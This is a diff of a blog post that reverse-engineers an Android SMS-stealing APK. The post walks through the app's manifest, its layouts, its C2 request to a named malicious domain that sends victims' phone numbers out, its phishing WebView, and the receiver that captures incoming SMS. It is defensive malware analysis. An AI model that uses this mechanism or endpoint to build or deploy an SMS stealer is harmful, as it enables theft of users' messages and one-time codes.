@@ -1,6 +1,6 @@
 ---
 title: Taking Apart an Android SMS Stealer
-date: 2024-02-05 09:25:00 +0800
+date: 2024-02-05 06:08:00 +0800
 categories: [android, malware]
 tags: [malware]
 ---
@@ -39,6 +39,7 @@ The following things are important to notice here:
 This is quite interesting! As you can see, manifests often reveal a ton of info about an APK.
 To start reversing the code, we convert `classes.dex`  (Dalvik Bytecode) into a jar with a handy tool called [dex2jar](https://github.com/pxb1988/dex2jar). After you have the `jar`, decompile it with a tool such as [jadx](https://github.com/skylot/jadx).
 The first activity to get executed is always `MainActivity` (We also saw it in the manifest), so let's start there:
+
 ```java
 package ir.siqe.holo;  
   
@@ -84,7 +85,9 @@ public class MainActivity extends AppCompatActivity {
     }  
 }
 ```
+
 We can see that the first function here is `onCreate`. Every activity has an `onCreate` function that is the first to get called when the activity is started. After calling the `onCreate` function of its parent, it sets the current layout. A layout is simply an XML that defines what to display on the user's screen. In this case, it sets the layout to a layout called `activity_main`. Let's look at its XML (It is located in the `res` folder we've seen earlier; also the XML is stored in binary XML so you need to decode it first with a tool such as [axmldec](https://github.com/ytsutano/axmldec)):
+
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:background="type28/4294967295" android:layout_width="4294967295" android:layout_height="4294967295">
@@ -95,6 +98,7 @@ We can see that the first function here is `onCreate`. Every activity has an `on
   </LinearLayout>
 </RelativeLayout>
 ```
+
 The layout contains the following components:
 - A `TextView` (regular text) that contains the string `Singup for Dns +ir`.
 - An `EditText` (Textbox for input) that says `شماره موبایل خود را وارد نمایید` ("Enter your phone number")
@@ -103,6 +107,7 @@ Afterwards, the listener of the button is set to a function called `onClick`. Th
 1. Verify that the text in the input box matches the regex `(\\+98|0)?9\\d{9}`. I think this regex is supposed to match a phone number, but it is bugged and matches the string `9\ddddddddd` for example. If there isn't a regex match, a toast is started with an error message.
 2. Request the `RECEIVE_SMS` permission. If the permission is granted, the phone number is stored inside the shared preferences (A storage for the app) with the `phone` key, and the `connect` function is called with the arguments: 1. THE PHONE NUMBER and 2. "تارگت جدید نصب کرد" (Installed new target).Finally, the `MainActivity2` activity is started.
 Let's start with `connect` and then move on to `MainActivity2`. Here's the decompilation:
+
 ```java
 package ir.siqe.holo;  
   
@@ -158,10 +163,12 @@ public class connect {
     }  
 }
 ```
+
 This function is very simple. It sends a request to `"https://eblaqie.org/ratsms.php?phone=" + arg1 + "&info=" + arg2` (For instance in the call we've seen in main it would contact `https://eblaqie.org/ratsms.php?phone=THE_PHONE_NUMBER_IN_THE_EDITTEXT&info=شماره موبایل خود را وارد نمایید` to signify that the malware got a new target) and the performs some error checking. Unfortunately, `eblaqie.org` is down now (I've also checked on WaybackMachine) so we can't test this further, but Virustotal shows that the site is malicious:
 ![virustotal-of-c2](/assets/img/smsstealer/virustotal_of_c2.png)
 _The VirusTotal of the C2_
 Now let's analyze `MainActivity2`:
+
 ```java
 package ir.siqe.holo;  
   
@@ -228,15 +235,19 @@ public class MainActivity2 extends AppCompatActivity {
     }  
 }
 ```
+
 Again, we start with `onCreate`. It sets the layout to a layout called `web`:
+
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="4294967295" android:layout_height="4294967295">
   <WebView android:id="type1/2131165433" android:layout_width="4294967295" android:layout_height="4294967295"/>
 </RelativeLayout>
 ```
+
 This layout only contains a WebView. A WebView allows to display content from the internet inside a layout. After setting the layout, the `onCreate` function loads the URL `https://eblaqie.org/pishgiri`. It would have been interesting to see what's on there, but again because the C2 is down we can't see it.
 Our final component to analyze is the SMS receiver (`MyReceiver`):
+
 ```java
 package ir.siqe.holo;  
   
@@ -281,6 +292,7 @@ public class MyReceiver extends BroadcastReceiver {
     }  
 }
 ```
+
 The only function defined here is `onReceive`. It gets called every time an SMS message is received, with an intent describing the message. The details of the message are passed inside the extras of the intent. If the extras are not null, the following things are performed:
 1. The PDUs of the SMS message are put inside an array
 2. A new array `smsMessageArr` of SMS messages is constructed from the PDUs
